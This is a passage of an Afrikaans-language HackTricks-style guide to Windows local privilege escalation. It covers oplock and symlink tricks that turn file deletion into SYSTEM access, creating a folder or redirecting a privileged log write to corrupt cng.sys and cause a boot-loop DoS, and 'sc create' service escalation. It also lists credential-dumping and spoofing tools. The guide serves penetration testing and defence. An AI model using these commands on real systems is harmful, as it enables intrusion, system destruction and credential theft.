> Alhoewel jy ’n *file*-delete API aanroep, **delete dit die folder self**.

### Van Folder Contents Delete na SYSTEM EoP
Wat as jou primitive jou nie toelaat om arbitrêre files/folders te delete nie, maar dit **wel deletion van die *contents* van ’n attacker-controlled folder toelaat**?

1. Step 1: Stel ’n bait folder en file op
- Create: `C:\temp\folder1`
- Binne-in dit: `C:\temp\folder1\file1.txt`

2. Step 2: Plaas ’n **oplock** op `file1.txt`
- Die oplock **pause execution** wanneer ’n privileged process probeer om `file1.txt` te delete.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Aktiveer SYSTEM-proses (bv. `SilentCleanup`)
- Hierdie proses skandeer vouers (bv. `%TEMP%`) en probeer om hul inhoud te verwyder.
- Wanneer dit by `file1.txt` kom, **oplock** aktiveer en beheer aan jou callback oorhandig.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Skuif `file1.txt` elders heen
- Dit maak `folder1` leeg sonder om die oplock te verbreek.
- Moenie `file1.txt` direk verwyder nie — dit sal die oplock voortydig vrystel.

- Opsie B: Skakel `folder1` om in ’n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep ’n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit teiken die NTFS-interne stroom wat vouermetadata stoor — die uitvee daarvan vee die vouer uit.

5. Stap 5: Stel die oplock vry
- Die SYSTEM-proses gaan voort en probeer om `file1.txt` uit te vee.
- Maar nou, weens die junction + symlink, vee dit eintlik die volgende uit:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultaat**: `C:\Config.Msi` word deur SYSTEM uitgevee.

### Van Skepping van 'n Willekeurige Lêergids tot Permanente DoS

Benut 'n primitive wat jou toelaat om 'n **willekeurige lêergids as SYSTEM/admin te skep** — selfs al **kan jy nie lêers skryf** of **swak toestemmings stel nie**.

Skep 'n **lêergids** (nie 'n lêer nie) met die naam van 'n **kritieke Windows-bestuurder**, byvoorbeeld:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad stem normaalweg ooreen met die `cng.sys` kernel-mode driver.
- As jy dit **vooraf as ’n lêergids skep**, kan Windows nie die werklike driver tydens boot laai nie.
- Daarna probeer Windows om `cng.sys` tydens boot te laai.
- Dit sien die lêergids, **kan nie die werklike driver resolve nie**, en **crash of stop die boot**.
- Daar is **geen fallback nie**, en **geen herstel** sonder eksterne ingryping nie (bv. boot repair of skyftoegang).

### Van bevoorregte log/backup-paaie + OM symlinks na arbitrêre file overwrite / boot DoS

Wanneer ’n **bevoorregte diens** logs/exports skryf na ’n pad wat uit ’n **skryfbare config** gelees word, redirect daardie pad met **Object Manager symlinks + NTFS mount points** om die bevoorregte write in ’n arbitrêre overwrite te verander (selfs **sonder** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Vereistes**
- Config wat die teikenpad stoor, is skryfbaar deur die aanvaller (bv. `%ProgramData%\...\.ini`).
- Vermoë om ’n mount point na `\RPC Control` en ’n OM file symlink te skep (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- ’n Bevoorregte operasie wat na daardie pad skryf (log, export, report).

**Voorbeeldketting**
1. Lees die config om die bevoorregte logbestemming te herwin, bv. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirect die pad sonder admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Wag totdat die privileged component die log skryf (bv. admin aktiveer "send test SMS"). Die write beland nou in `C:\Windows\System32\cng.sys`.
4. Inspekteer die overwritten target (hex/PE parser) om corruption te bevestig; ’n reboot dwing Windows om die tampered driver path te laai → **boot loop DoS**. Dit veralgemeen ook na enige protected file wat ’n privileged service vir write sal oopmaak.

> `cng.sys` word normaalweg vanaf `C:\Windows\System32\drivers\cng.sys` gelaai, maar as ’n kopie in `C:\Windows\System32\cng.sys` bestaan, kan dit eerste probeer word, wat dit ’n betroubare DoS-sink vir beskadigde data maak.



## **Van High Integrity na System**

### **Nuwe diens**

As jy reeds op ’n High Integrity-proses loop, kan die **pad na SYSTEM** maklik wees deur eenvoudig ’n nuwe diens te **skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service binary skep, maak seker dit is 'n geldige service of dat die binary die nodige aksies vinnig uitvoer, aangesien dit binne 20s beëindig sal word indien dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Vanaf 'n High Integrity-proses kan jy probeer om die **AlwaysInstallElevated-registerinskrywings te aktiveer** en 'n reverse shell te **installeer** met behulp van 'n _**.msi**_-wrapper.\
[Meer inligting oor die registersleutels wat betrokke is en hoe om 'n _.msi_-pakket te installeer, is hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**die kode hier vind**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (jy sal dit waarskynlik in 'n reeds High Integrity-proses vind), sal jy met die SeDebug privilege **byna enige proses** (nie protected processes nie) kan **oopmaak**, die **token van die proses kan kopieer**, en 'n **arbitrary process met daardie token kan skep**.\
Deur hierdie tegniek te gebruik, word daar gewoonlik **enige proses wat as SYSTEM loop met al die token privileges gekies** (_ja, jy kan SYSTEM-prosesse sonder al die token privileges vind_).\
**Jy kan 'n** [**kodevoorbeeld wat die voorgestelde tegniek uitvoer, hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie tegniek word deur meterpreter gebruik om in `getsystem` te eskaleer. Die tegniek bestaan uit **die skep van 'n pipe en daarna die skep/misbruik van 'n service om na daardie pipe te skryf**. Dan sal die **server** wat die pipe met die **`SeImpersonate`** privilege geskep het, die **token** van die pipe-client (die service) kan **impersonate**, en sodoende SYSTEM privileges verkry.\
As jy [**meer oor name pipes wil leer, moet jy dit lees**](#named-pipe-client-impersonation).\
As jy 'n voorbeeld wil lees van [**hoe om van high integrity na System te gaan deur name pipes te gebruik, moet jy dit lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n dll te **hijack** wat deur 'n **proses** gelaai word wat as **SYSTEM** loop, sal jy arbitrary code met daardie permissions kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie soort privilege escalation, en dit is boonop **baie makliker om vanuit 'n high integrity-proses te bewerkstellig**, aangesien dit **write permissions** op die vouers sal hê wat gebruik word om dlls te laai.\
**Jy kan** [**hier meer oor Dll hijacking leer**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Beste tool om Windows local privilege escalation vectors te vind:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir misconfigurations en sensitiewe lêers (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gedetecteer.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir moontlike misconfigurations en versamel inligting (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek gestoorde sessie-inligting van PuTTY, WinSCP, SuperPuTTY, FileZilla en RDP. Gebruik -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek credentials uit Credential Manager. Gedetecteer.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde wagwoorde oor die domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS-spoofer en man-in-the-middle-tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows-enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Soek vir bekende privesc vulnerabilities (DEPRECATED vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Plaaslike checks **(Admin-regte benodig)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek vir bekende privesc vulnerabilities (moet met VisualStudio gekompileer word) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerate die host op soek na misconfigurations (meer 'n gather info-tool as privesc) (moet gekompileer word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek credentials uit baie softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kontroleer vir misconfiguration (executable precompiled in github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike misconfigurations (exe vanaf python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool geskep op grond van hierdie post (dit benodig nie accesschk om korrek te werk nie, maar dit kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitvoer van **systeminfo** en beveel werkende exploits aan (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitvoer van **systeminfo** en beveel werkende exploits aan (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek met die korrekte weergawe van .NET kompileer ([**sien dit hier**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die victim host te sien, kan jy doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [1] [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - a cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows Privilege Escalation Methods for Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Chaining CLDFLT and DirectX Kernel Race Conditions for Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abusing Arbitrary File Deletes to Escalate Privilege and Other Great Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, a Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Exploring Credential Manager and Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)

{{#include ../../banners/hacktricks-training.md}}
